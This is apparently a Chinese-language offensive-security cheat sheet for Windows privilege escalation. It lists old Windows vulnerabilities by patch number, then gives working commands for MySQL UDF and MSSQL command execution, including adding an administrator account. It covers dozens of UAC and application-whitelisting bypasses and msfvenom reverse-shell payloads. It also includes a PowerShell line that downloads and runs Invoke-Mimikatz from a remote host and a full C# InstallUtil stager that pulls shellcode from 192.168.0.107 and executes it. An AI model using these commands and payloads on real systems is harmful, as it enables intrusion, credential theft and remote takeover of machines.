MS17-017 [KB4013081] [GDI Palette Objects Local Privilege Escalation] (windows 7/8) 
CVE-2017-8464 [LNK Remote Code Execution Vulnerability] (windows 10/8.1/7/2016/2010/2008) 
CVE-2017-0213 [Windows COM Elevation of Privilege Vulnerability] (windows 10/8.1/7/2016/2010/2008) 
MS17-010 [KB4013389] [Windows Kernel Mode Drivers] (windows 7/2008/2003/XP) 
MS16-135 [KB3199135] [Windows Kernel Mode Drivers] (2016) 
MS16-111 [KB3186973] [kernel api] (Windows 10 10586 (32/64)/8.1) 
MS16-098 [KB3178466] [Kernel Driver] (Win 8.1) 
MS16-075 [KB3164038] [Hot Potato] (2003/2008/7/8/2012) 
MS16-034 [KB3143145] [Kernel Driver] (2008/7/8/10/2012) 
MS16-032 [KB3143141] [Secondary Logon Handle] (2008/7/8/10/2012) 
MS16-016 [KB3136041] [WebDAV] (2008/Vista/7) 
MS15-097 [KB3089656] [remote code execution] (win8.1/2012) 
MS15-076 [KB3067505] [RPC] (2003/2008/7/8/2012) 
MS15-077 [KB3077657] [ATM] (XP/Vista/Win7/Win8/2000/2003/2008/2012) 
MS15-061 [KB3057839] [Kernel Driver] (2003/2008/7/8/2012) 
MS15-051 [KB3057191] [Windows Kernel Mode Drivers] (2003/2008/7/8/2012) 
MS15-010 [KB3036220] [Kernel Driver] (2003/2008/7/8) 
MS15-015 [KB3031432] [Kernel Driver] (Win7/8/8.1/2012/RT/2012 R2/2008 R2) 
MS15-001 [KB3023266] [Kernel Driver] (2008/2012/7/8) 
MS14-070 [KB2989935] [Kernel Driver] (2003) 
MS14-068 [KB3011780] [Domain Privilege Escalation] (2003/2008/2012/7/8) 
MS14-058 [KB3000061] [Win32k.sys] (2003/2008/2012/7/8) 
MS14-040 [KB2975684] [AFD Driver] (2003/2008/2012/7/8) 
MS14-002 [KB2914368] [NDProxy] (2003/XP) 
MS13-053 [KB2850851] [win32k.sys] (XP/Vista/2003/2008/win 7) 
MS13-046 [KB2840221] [dxgkrnl.sys] (Vista/2003/2008/2012/7) 
MS13-005 [KB2778930] [Kernel Mode Driver] (2003/2008/2012/win7/8) 
MS12-042 [KB2972621] [Service Bus] (2008/2012/win7) 
MS12-020 [KB2671387] [RDP] (2003/2008/7/XP) 
MS11-080 [KB2592799] [AFD.sys] (2003/XP) 
MS11-062 [KB2566454] [NDISTAPI] (2003/XP) 
MS11-046 [KB2503665] [AFD.sys] (2003/2008/7/XP) 
MS11-011 [KB2393802] [kernel Driver] (2003/2008/7/XP/Vista) 
MS10-092 [KB2305420] [Task Scheduler] (2008/7) 
MS10-065 [KB2267960] [FastCGI] (IIS 5.1, 6.0, 7.0, and 7.5) 
MS10-059 [KB982799] [ACL-Churraskito] (2008/7/Vista) 
MS10-048 [KB2160329] [win32k.sys] (XP SP2 &amp; SP3/2003 SP2/Vista SP1 &amp; SP2/2008 Gold &amp; SP2 &amp; R2/Win7) 
MS10-015 [KB977165] [KiTrap0D] (2003/2008/7/XP) 
MS10-012 [KB971468] [SMB Client Trans2 stack overflow] (Windows 7/2008R2) 
MS09-050 [KB975517] [Remote Code Execution] (2008/Vista) 
MS09-020 [KB970483] [IIS 6.0] (IIS 5.1 and 6.0) 
MS09-012 [KB959454] [Chimichurri] (Vista/win7/2008/Vista) 
MS08-068 [KB957097] [Remote Code Execution] (2000/XP) 
MS08-067 [KB958644] [Remote Code Execution] (Windows 2000/XP/Server 2003/Vista/Server 2008) 
MS08-066 [] [] (Windows 2000/XP/Server 2003) 
MS08-025 [KB941693] [Win32.sys] (XP/2003/2008/Vista) 
MS06-040 [KB921883] [Remote Code Execution] (2003/xp/2000) 
MS05-039 [KB899588] [PnP Service] (Win 9X/ME/NT/2000/XP/2003)
MS03-026 [KB823980] [Buffer Overrun In RPC Interface] (/NT/2000/XP/2003)
</code></pre>
<h3 id="激活guest"><a href="#激活guest" class="headerlink" title="激活guest"></a>激活guest</h3><pre><code>&gt;net user guest /active:yes
</code></pre>
<h3 id="MYSQL-udf"><a href="#MYSQL-udf" class="headerlink" title="MYSQL udf"></a>MYSQL udf</h3><pre><code>Udf: sqlmap-master\udf\mysql\windows\
&gt;python sqlmap/extra/cloak/cloak.py lib_mysqludf_sys.dll _ 
Mysql&gt;5.1 udf.dll放置在lib\plugin 
Mysql&lt;5.1 udf.dll放置在c:\windows\system32
#show variables like &#39;%compile%&#39;; 查看系统版本
#select @@plugin_dir 查看插件目录
放入udf
#select load_file(&#39;\\\\192.168.0.19\\network\\lib_mysqludf_sys_64.dll&#39;) into dumpfile &quot;D:\\MySQL\\mysql-5.7.2\\lib\\plugin\\udf.dll&quot;; 
或将udf十六进制编码后写入
#select hex(load_file(&#39;udf_sys_64.dll&#39;)) into dumpfile &#39;/tmp/udf.hex&#39;; 
#select 0x4d5a90000300000004000000ffff0000b80000000000000040000000000000000000000000000000000000… into dump file &quot;D:\\MySQL\\mysql-5.7.2\\lib\\plugin\\udf.dll&quot;;
或将udf base64编码后写入(MySQL 5.6.1和MariaDB 10.0.5)
#select to_base64(load_file(&#39;/usr/udf.dll&#39;)) into dumpfile &#39;/tmp/udf.b64&#39;;
#select from_base64(“xxxxx”) into dumpfile &quot;D:\\MySQL\\mysql-5.7.2\\lib\\plugin\\udf.dll&quot;;
或创建表拼接十六进制编码
#create table temp(data longblob); 
#insert into temp(data) values (0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000f00000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d); 
#update temp set data = concat(data,0x33c2ede077a383b377a383b377a383b369f110b375a383b369f100b37da383b369f107b375a383b35065f8b374a383b3); 
#select data from temp into dump file &quot;D:\\MySQL\\mysql-5.7.2\\lib\\plugin\\udf.dll&quot;;
或#insert into temp(data) values(hex(load_file(&#39;D:\\MySQL\\mysql-5.7.2\\lib\\plugin\\udf.dll&#39;)));
#SELECT unhex(cmd) FROM mysql.temp INTO DUMPFILE &#39;D:\\MySQL\\mysql-5.7.2\\lib\\plugin\\udf.dll &#39;;
或使用快速导入数据
#load data infile &#39;\\\\192.168.0.19\\network\\udf.hex&#39;
#into table temp fields terminated by &#39;@OsandaMalith&#39; lines terminated by &#39;@OsandaMalith&#39; (data); 
#select unhex(data) from temp into dumpfile &#39;D:\\MySQL\\mysql-5.7.2\\lib\\plugin\\udf.dll&#39;;
创建函数
#create function cmdshell returns string soname &#39;udf.dll&#39;;
#create function sys_exec returns int soname &#39;udf.dll&#39;;
执行命令
#select cmdshell(&#39;whoami&#39;); 
#select sys_exec(&#39;&#39;whoami&#39;&#39;); 
删除函数
#drop function cmdshell;
#drop function sys_exec;
</code></pre>
<h3 id="MYSQL-Linux-Root"><a href="#MYSQL-Linux-Root" class="headerlink" title="MYSQL Linux Root"></a>MYSQL Linux Root</h3><pre><code>https://0xdeadbeef.info/exploits/raptor_udf2.c
$ gcc -g -c raptor_udf2.c
$ gcc -g -shared -W1,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
$ mysql -u root -p
mysql&gt; use mysql;
mysql&gt; create table foo(line blob);
mysql&gt; insert into foo values(load_file(&#39;/home/raptor/raptor_udf2.so&#39;));
mysql&gt; select * from foo into dumpfile &#39;/usr/lib/raptor_udf2.so&#39;;
mysql&gt; create function do_system returns integer soname &#39;raptor_udf2.so&#39;;
mysql&gt; select * from mysql.func;
</code></pre>
<table>
<thead>
<tr>
<th>name</th>
<th>ret</th>
<th>dl</th>
<th>type</th>
</tr>
</thead>
<tbody><tr>
<td>do_system</td>
<td>2</td>
<td>raptor_udf2.so</td>
<td>function</td>
</tr>
</tbody></table>
<pre><code>mysql&gt; select do_system(&#39;id &gt; /tmp/out; chown raptor.raptor /tmp/out&#39;);
mysql&gt; \! sh
sh-2.05b$ cat /tmp/out
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)
</code></pre>
<h3 id="MSSQL-4"><a href="#MSSQL-4" class="headerlink" title="MSSQL"></a>MSSQL</h3><pre><code>开启xp_cmdshell
</code></pre>
<h4 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h4><pre><code>#exec sp_configure &#39;show advanced options&#39;, 1;reconfigure; 
#exec sp_configure &#39;xp_cmdshell&#39;,1;reconfigure;
#exec master.dbo.xp_cmdshell &#39;ipconfig&#39;
</code></pre>
<h4 id="xp-regwrite"><a href="#xp-regwrite" class="headerlink" title="xp_regwrite"></a>xp_regwrite</h4><pre><code>xp_regwrite &#39;HKEY_LOCAL_MACHINE&#39;,&#39;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&#39;,&#39;debugger&#39;,&#39;reg_sz&#39;,&#39;c:\windows\system32\taskmgr.exe&#39;
</code></pre>
<h4 id="xp-dirtree"><a href="#xp-dirtree" class="headerlink" title="xp_dirtree"></a>xp_dirtree</h4><pre><code>execute master..xp_dirtree &#39;c:&#39; //列出所有c:\文件和目录,子目录 
execute master..xp_dirtree &#39;c:&#39;,1 //只列c:\文件夹 
execute master..xp_dirtree &#39;c:&#39;,1,1 //列c:\文件夹加文件 
</code></pre>
<h4 id="sp-oacreate"><a href="#sp-oacreate" class="headerlink" title="sp_oacreate"></a>sp_oacreate</h4><pre><code>exec sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;
exec sp_configure &#39;Ola Automation Procedures&#39; , 1;RECONFIGURE;
执行命令
declare @shell int 
exec sp_oacreate &#39;wscript.shell&#39;,@shell output 
exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe /c net user 123 123 /add&#39;
declare @shell int 
exec sp_oacreate &#39;wscript.shell&#39;,@shell output 
exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe /c net localgroup administrators 123/add&#39;
删除文件
declare @result int
declare @fso_token int
exec sp_oacreate &#39;scripting.filesystemobject&#39;, @fso_token out
exec sp_oamethod @fso_token,&#39;deletefile&#39;,null,&#39;c:\1.txt&#39;
exec sp_oadestroy @fso_token
复制文件
declare @o int
exec sp_oacreate &#39;scripting.filesystemobject&#39;,@o out
exec sp_oamethod @o,&#39;copyfile&#39;,null,&#39;c:\1.txt&#39;,&#39;c:\2.txt&#39;
移动文件
declare @o int
exec sp_oacreate &#39;scripting.filesystemobject&#39;,@o out
exec sp_oamethod @o,&#39;movefile&#39;,null,&#39;c:\1.txt&#39;,&#39;c:\2.txt&#39;
</code></pre>
<h4 id="沙盒执行"><a href="#沙盒执行" class="headerlink" title="沙盒执行"></a>沙盒执行</h4><pre><code>开启沙盒：
&gt;exec master..xp_regwrite &#39;HKEY_LOCAL_MACHINE&#39;,&#39;SOFTWARE\Microsoft\Jet\4.0\Engines&#39;,&#39;SandBoxMode&#39;,&#39;REG_DWORD&#39;,1
执行：
&gt;select * from openrowset(&#39;microsoft.jet.oledb.4.0&#39;,&#39;;database=c:\windows\system32\ias\dnary.mdb&#39;,&#39;select shell(&quot;whoami&quot;)&#39;)
</code></pre>
<h4 id="WarSQLKit-后门"><a href="#WarSQLKit-后门" class="headerlink" title="WarSQLKit(后门)"></a>WarSQLKit(后门)</h4><pre><code>http://eyupcelik.com.tr/guvenlik/493-mssql-fileless-rootkit-warsqlkit
</code></pre>
<h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><pre><code>发现补丁
#use post/windows/gather/enum_patches
列举可用EXP
#use post/multi/recon/local_exploit_suggester
</code></pre>
<h3 id="Bypass-UAC"><a href="#Bypass-UAC" class="headerlink" title="Bypass UAC"></a>Bypass UAC</h3><h4 id="MSF-1"><a href="#MSF-1" class="headerlink" title="MSF"></a>MSF</h4><pre><code>&gt;use exploit/windows/local/bypassuac 
&gt;use exploit/windows/local/bypassuac_injection
&gt;use exploit/windows/local/bypassuac_vbs
&gt;use exploit/windows/local/bypassuac_fodhelper
&gt;use exploit/windows/local/bypassuac_eventvwr
&gt;use exploit/windows/local/bypassuac_comhijack
</code></pre>
<h4 id="DccwBypassUAC"><a href="#DccwBypassUAC" class="headerlink" title="DccwBypassUAC"></a>DccwBypassUAC</h4><pre><code>Use on win10&amp;win8
</code></pre>
<p><img src="105.png" alt="image"></p>
<h4 id="K8uac"><a href="#K8uac" class="headerlink" title="K8uac"></a>K8uac</h4><pre><code>&gt;k8uac.exe xx.exe
&gt;k8uac.exe &quot;command&quot;
</code></pre>
<h4 id="CMSTP"><a href="#CMSTP" class="headerlink" title="CMSTP"></a>CMSTP</h4><pre><code>设置UAC和Applocker规则
</code></pre>
<p><img src="106.png" alt="image"><br><img src="107.png" alt="image"><br><img src="108.png" alt="image"><br><img src="109.png" alt="image"></p>
<pre><code>MSF生成恶意DLL传入靶机
&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=12138 -f dll -o /var/www/html/cm.dll
</code></pre>
<p><img src="110.png" alt="image"></p>
<pre><code>DLL同目录下建立run.inf，RegisterOCXSection指定dll位置，也可以指定远程webdav
如：\\192.168.0.107\webdav\cm.dll
[version]
Signature=$chicago$
AdvancedINF=2.5
[DefaultInstall_SingleUser]
RegisterOCXs=RegisterOCXSection
[RegisterOCXSection]
C:\Users\y.SUB2K8\Desktop\cm.dll
[Strings]
AppAct = &quot;SOFTWARE\Microsoft\Connection Manager&quot;
ServiceName=&quot;cmstp&quot;
ShortSvcName=&quot;cmstp&quot;
执行命令可绕过UAC和Applocker上线
&gt;cmstp /s run.inf
</code></pre>
<p><img src="111.png" alt="image"></p>
<h4 id="Uacme"><a href="#Uacme" class="headerlink" title="Uacme"></a>Uacme</h4><pre><code>包括DLL劫持，COM劫持等50多种bypass方法
https://github.com/hfiref0x/UACME
</code></pre>
<p><img src="112.png" alt="image"></p>
<pre><code>使用visual studio编译
Visual Studio 2013v120；
Visual Studio 2015v140；
Visual Studio 2017v141;
Visual Studio 2019v142。
目前共59种bypassuac方式
执行方法是
&gt;akagi.exe 1
&gt;akagi.exe 1 c:\windows\system32\cmd.exe
&gt;akagi.exe 1 &quot;net user 1 1 /add&quot;
注意：
方式5，9会对目标安全性产生影响，谨慎使用，5需重启
方式6从win8开始在x64上不可用
方式11，54只支持x32 
方式13，19，30，50只支持x64
方式14需要进程注入，x64要使用x64的工具
</code></pre>
<h4 id="Bypass-UAC-1"><a href="#Bypass-UAC-1" class="headerlink" title="Bypass-UAC"></a>Bypass-UAC</h4><pre><code>https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC
&gt;Bypass-UAC -Method UacMethodSysprep
</code></pre>
<p><img src="113.png" alt="image"></p>
<pre><code>Method:
UacMethodSysprep
ucmDismMethod
UacMethodMMC2
UacMethodTcmsetup
UacMethodNetOle32
</code></pre>
<h4 id="DLL-hijack"><a href="#DLL-hijack" class="headerlink" title="DLL hijack"></a>DLL hijack</h4><pre><code>程序运行，调用DLL的流程
1.程序所在目录
2.系统目录即 SYSTEM32 目录
3.16位系统目录即 SYSTEM 目录
4.Windows目录
5.加载 DLL 时所在的当前目录
6.PATH环境变量中列出的目录
使用
https://docs.microsoft.com/zh-cn/sysinternals/downloads/sigcheck
检查一个程序的是否以高权限执行
&gt;sigcheck.exe -m c:\1.exe
查看autoElevate是否为true
</code></pre>
<p><img src="114.png" alt="image"></p>
<pre><code>使用process monitor查看对应程序执行时调用的DLL情况，查找DLL不在
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs列表中，并且所在文件夹当前用户可读写，接下来生成恶意dll备份原DLL替换，再运行此程序即可劫持成功。
</code></pre>
<h4 id="SilentCleanup"><a href="#SilentCleanup" class="headerlink" title="SilentCleanup"></a>SilentCleanup</h4><pre><code>&gt;reg add hkcu\Environment /v windir /d &quot;cmd /K reg delete hkcu\Environment /v windir /f &amp;&amp; REM &quot;
&gt;schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I
</code></pre>
<h4 id="Sdclt"><a href="#Sdclt" class="headerlink" title="Sdclt"></a>Sdclt</h4><pre><code>win10
</code></pre>
<h5 id="1-1"><a href="#1-1" class="headerlink" title="1"></a>1</h5><pre><code>&gt;reg add &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe&quot; /t REG_SZ /d %COMSPEC% /f 获得管理员权限
&gt;sdclt 弹出cmd
&gt;reg delete &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe&quot; /f 清除痕迹
</code></pre>
<h5 id="2-1"><a href="#2-1" class="headerlink" title="2"></a>2</h5><pre><code>https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Invoke-SDCLTBypass.ps1
&gt;Invoke-SDCLTBypass -Command &quot;c:\windows\system32\cmd.exe /c C:\Windows\regedit.exe&quot;
&gt;sdclt.exe /KickOffElev
</code></pre>
<h4 id="Makecab-amp-Wusa"><a href="#Makecab-amp-Wusa" class="headerlink" title="Makecab&amp;Wusa"></a>Makecab&amp;Wusa</h4><pre><code>复制文件出错时
</code></pre>
<p><img src="115.png" alt="image"></p>
<pre><code>&gt;makecab PsExec64.exe C:\Users\y.ZONE\Desktop\ps.cab
&gt;wusa C:\Users\y.ZONE\Desktop\ps.cab /extract:C:\Windows\system32\
</code></pre>
<p><img src="116.png" alt="image"></p>
<h4 id="CLR-BypassUAC"><a href="#CLR-BypassUAC" class="headerlink" title="CLR BypassUAC"></a>CLR BypassUAC</h4><pre><code>Tested on win10 x64
生成dll传入受控机temp目录，以下保存为1.bat执行。
REG ADD &quot;HKCU\Software\Classes\CLSID\&#123;FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF&#125;\InprocServer32&quot; /ve /t REG_EXPAND_SZ /d &quot;C:\Temp\test.dll&quot; /f
REG ADD &quot;HKCU\Environment&quot; /v &quot;COR_PROFILER&quot; /t REG_SZ /d &quot;&#123;FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF&#125;&quot; /f
REG ADD &quot;HKCU\Environment&quot; /v &quot;COR_ENABLE_PROFILING&quot; /t REG_SZ /d &quot;1&quot; /f
REG ADD &quot;HKCU\Environment&quot; /v &quot;COR_PROFILER_PATH&quot; /t REG_SZ /d &quot;C:\Temp\test.dll&quot; /f
受控机执行gpedit.msc或eventvwr等高权限.net程序时可劫持成功。
</code></pre>
<p><img src="117.png" alt="image"></p>
<pre><code>执行后
</code></pre>
<p><img src="118.png" alt="image"><br><img src="119.png" alt="image"><br><img src="120.png" alt="image"></p>
<h4 id="eventvwr劫持注册表"><a href="#eventvwr劫持注册表" class="headerlink" title="eventvwr劫持注册表"></a>eventvwr劫持注册表</h4><pre><code>打开ProcessMonitor，启动eventvwr，ctrl+T打开进程树，选择进程转到事件
</code></pre>
<p><img src="121.png" alt="image"></p>
<pre><code>右键选择包括eventvwr.exe
</code></pre>
<p><img src="122.png" alt="image"></p>
<pre><code>只选择显示注册表活动
</code></pre>
<p><img src="123.png" alt="image"></p>
<pre><code>添加一条过滤器，显示not found文件
</code></pre>
<p><img src="124.png" alt="image"></p>
<pre><code>找到相应的注册表位置
</code></pre>
<p><img src="125.png" alt="image"><br><img src="126.png" alt="image"></p>
<pre><code>值修改为
</code></pre>
<p><img src="127.png" alt="image"></p>
<pre><code>MSF监听，再次打开eventvwr
</code></pre>
<p><img src="128.png" alt="image"></p>
<h4 id="Web-Delivery"><a href="#Web-Delivery" class="headerlink" title="Web Delivery"></a>Web Delivery</h4><pre><code>&gt;use exploit/multi/script/web_delivery
&gt;set target 3
&gt;set payload windows/x64/meterpreter/reverse_tcp
&gt;exploit
&gt;use auxiliary/server/regsvr32_command_delivery_server
&gt;set cmd ipconfig
&gt;use exploit/windows/misc/regsvr32_applocker_bypass_server
</code></pre>
<h4 id="Invoke-PsUACme"><a href="#Invoke-PsUACme" class="headerlink" title="Invoke-PsUACme"></a>Invoke-PsUACme</h4><pre><code>method=&quot;sysprep&quot;,&quot;oobe&quot;,&quot;ActionQueue&quot;,&quot;migwiz&quot;,&quot;cliconfg&quot;,&quot;winsat&quot;,&quot;mmc&quot;
&gt;Invoke-PsUACme -method oobe -Payload &quot;c:\user\a\desktop\x.exe&quot;
需指定绝对路径
&gt;Invoke-PsUACme -method oobe -Payload &quot;powershell -w hidden -e xxxxxx&quot;
&gt;Invoke-PsUACme -Payload &quot;powershell -noexit IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/powersploit/Exfiltration/Invoke-Mimikatz.ps1&#39;); Invoke-Mimikatz&quot;
MSFVENOM生成psh-reflection格式脚本
&gt;Invoke-PsUACme –Payload &quot;powershell c:\1.ps1&quot;
</code></pre>
<h3 id="Whitelist-白名单"><a href="#Whitelist-白名单" class="headerlink" title="Whitelist(白名单)"></a>Whitelist(白名单)</h3><h4 id="GreatSCT-1"><a href="#GreatSCT-1" class="headerlink" title="GreatSCT"></a>GreatSCT</h4><pre><code>&gt;git clone https://github.com/GreatSCT/GreatSCT.git
&gt;cd GreatSCT/setup&amp;./setup.sh
&gt;use Bypass
&gt;list
&gt;use regasm/meterpreter/rev_tcp.py
&gt;msfconsole -r /usr/share/greatsct-output/handlers/payload.rc
</code></pre>
<h4 id="JSRat"><a href="#JSRat" class="headerlink" title="JSRat"></a>JSRat</h4><pre><code>&gt;JSRat.py -i 192.168.1.107 -p 4444
</code></pre>
<h4 id="Odbcconf-exe"><a href="#Odbcconf-exe" class="headerlink" title="Odbcconf.exe"></a>Odbcconf.exe</h4><pre><code>&gt;odbcconf.exe /a &#123;regsvr C:\shell.dll&#125; 可以是任意后缀
</code></pre>
<h4 id="Msiexec-exe"><a href="#Msiexec-exe" class="headerlink" title="Msiexec.exe"></a>Msiexec.exe</h4><pre><code>&gt;msiexec /y c:\user\admin\desktop\1.dll
&gt;msiexec /q /i http://192.168.0.107/dll.dll
</code></pre>
<h4 id="InstallUtil-exe"><a href="#InstallUtil-exe" class="headerlink" title="InstallUtil.exe"></a>InstallUtil.exe</h4><pre><code>&gt;C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /r:System.IO.Compression.dll /target:library /out:y.exe  /unsafe C:\Users\y\Desktop\1.cs
using System;
using System.Net;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading;
using System.Configuration.Install;
using System.Windows.Forms;
public class GQLBigHgUniLuVx &#123;
    public static void Main()
    &#123;
        while(true)
        &#123;&#123; MessageBox.Show("doge"); Console.ReadLine();&#125;&#125;
    &#125;
&#125;
[System.ComponentModel.RunInstaller(true)]
public class esxWUYUTWShqW : System.Configuration.Install.Installer
&#123;
    public override void Uninstall(System.Collections.IDictionary zWrdFAUHmunnu)
    &#123;
        jkmhGrfzsKQeCG.LCIUtRN();
    &#125;
&#125;
public class jkmhGrfzsKQeCG
&#123; [DllImport(&quot;kernel&quot;)] private static extern UInt32 VirtualAlloc(UInt32 YUtHhF,UInt32 VenifEUR, UInt32 NIHbxnOmrgiBGL, UInt32 KIheHEUxhAfOI);
[DllImport(&quot;kernel32&quot;)] private static extern IntPtr CreateThread(UInt32 GDmElasSZbx, UInt32 rGECFEZG, UInt32 UyBSrAIp,IntPtr sPEeJlufmodo, UInt32 jmzHRQU, ref UInt32 SnpQPGMvDbMOGmn);
[DllImport(&quot;kernel32&quot;)] private static extern UInt32 WaitForSingleObject(IntPtr pRIwbzTTS, UInt32 eRLAWWYQnq);
static byte[] ErlgHH(string ZwznjBJY,int KsMEeo) &#123;
IPEndPoint qAmSXHOKCbGlysd = new IPEndPoint(IPAddress.Parse(ZwznjBJY), KsMEeo);
Socket XXxIoIXNCle = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
try &#123; XXxIoIXNCle.Connect(qAmSXHOKCbGlysd); &#125;
catch &#123; return null;&#125;
byte[] UmquAHRnhhpuE = new byte[4];
XXxIoIXNCle.Receive(UmquAHRnhhpuE,4,0);
int kFVRSNnpj = BitConverter.ToInt32(UmquAHRnhhpuE,0);
byte[] qaYyFq = new byte[kFVRSNnpj +5];
int SRCDELibA =0;
while(SRCDELibA &lt; kFVRSNnpj)
&#123; SRCDELibA += XXxIoIXNCle.Receive(qaYyFq, SRCDELibA +5,(kFVRSNnpj - SRCDELibA)&lt;4096 ? (kFVRSNnpj - SRCDELibA) : 4096,0);&#125;
byte[] TvvzOgPLqwcFFv =BitConverter.GetBytes((int)XXxIoIXNCle.Handle);
Array.Copy(TvvzOgPLqwcFFv,0, qaYyFq,1,4); qaYyFq[0]=0xBF;
return qaYyFq;&#125;
static void cmMtjerv(byte[] HEHUjJhkrNS) &#123;
if(HEHUjJhkrNS !=null) &#123;
UInt32 WcpKfU = VirtualAlloc(0,(UInt32)HEHUjJhkrNS.Length,0x1000,0x40);
Marshal.Copy(HEHUjJhkrNS,0,(IntPtr)(WcpKfU), HEHUjJhkrNS.Length);
IntPtr UhxtIFnlOQatrk = IntPtr.Zero;
UInt32 wdjYKFDCCf =0;
IntPtr XVYcQxpp = IntPtr.Zero;
UhxtIFnlOQatrk = CreateThread(0,0, WcpKfU, XVYcQxpp,0, ref wdjYKFDCCf);
WaitForSingleObject(UhxtIFnlOQatrk,0xFFFFFFFF); &#125;&#125;
public static void LCIUtRN() &#123;
byte[] IBtCWU =null; IBtCWU = ErlgHH(&quot;192.168.0.107&quot;,12138);
cmMtjerv(IBtCWU);
&#125; &#125;
生成exe后执行
&gt;C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Users\y\Desktop\y.exe
MSF监听12138端口
</code></pre>
<h4 id="Compiler-exe"><a href="#Compiler-exe" class="headerlink" title="Compiler.exe"></a>Compiler.exe</h4><pre><code>&gt;C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe 1.xml 1.tcp
</code></pre>
<p><img src="129.png" alt="image"></p>
<h5 id="1-xml"><a href="#1-xml" class="headerlink" title="1.xml"></a>1.xml</h5><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;CompilerInput xmlns:i=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/Microsoft.Workflow.Compiler&quot;&gt;
&lt;files xmlns:d2p1=&quot;http://schemas.microsoft.com/2003/10/Serialization/Arrays&quot;&gt;
&lt;d2p1:string&gt;1.tcp&lt;/d2p1:string&gt;
&lt;/files&gt;
&lt;parameters xmlns:d2p1=&quot;http://schemas.datacontract.org/2004/07/System.Workflow.ComponentModel.Compiler&quot;&gt;
&lt;assemblyNames xmlns:d3p1=&quot;http://schemas.microsoft.com/2003/10/Serialization/Arrays&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;/&gt;
&lt;compilerOptions i:nil=&quot;true&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;/&gt;
&lt;coreAssemblyFileName xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;&gt;&lt;/coreAssemblyFileName&gt;
&lt;embeddedResources xmlns:d3p1=&quot;http://schemas.microsoft.com/2003/10/Serialization/Arrays&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;/&gt;
&lt;evidence xmlns:d3p1=&quot;http://schemas.datacontract.org/2004/07/System.Security.Policy&quot; i:nil=&quot;true&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;/&gt;
&lt;generateExecutable xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;&gt;false&lt;/generateExecutable&gt;
&lt;generateInMemory xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;&gt;true&lt;/generateInMemory&gt;
&lt;includeDebugInformation xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;&gt;false&lt;/includeDebugInformation&gt;
&lt;linkedResources xmlns:d3p1=&quot;http://schemas.microsoft.com/2003/10/Serialization/Arrays&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;/&gt;
&lt;mainClass i:nil=&quot;true&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;/&gt;
&lt;outputName xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;&gt;&lt;/outputName&gt;
&lt;tempFiles i:nil=&quot;true&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;/&gt;
&lt;treatWarningsAsErrors xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;&gt;false&lt;/treatWarningsAsErrors&gt;
&lt;warningLevel xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;&gt;-1&lt;/warningLevel&gt;
&lt;win32Resource i:nil=&quot;true&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;/&gt;
&lt;d2p1:checkTypes&gt;false&lt;/d2p1:checkTypes&gt;
&lt;d2p1:compileWithNoCode&gt;false&lt;/d2p1:compileWithNoCode&gt;
&lt;d2p1:compilerOptions i:nil=&quot;true&quot; /&gt;
&lt;d2p1:generateCCU&gt;false&lt;/d2p1:generateCCU&gt;
&lt;d2p1:languageToUse&gt;CSharp&lt;/d2p1:languageToUse&gt;
&lt;d2p1:libraryPaths xmlns:d3p1=&quot;http://schemas.microsoft.com/2003/10/Serialization/Arrays&quot; i:nil=&quot;true&quot; /&gt;
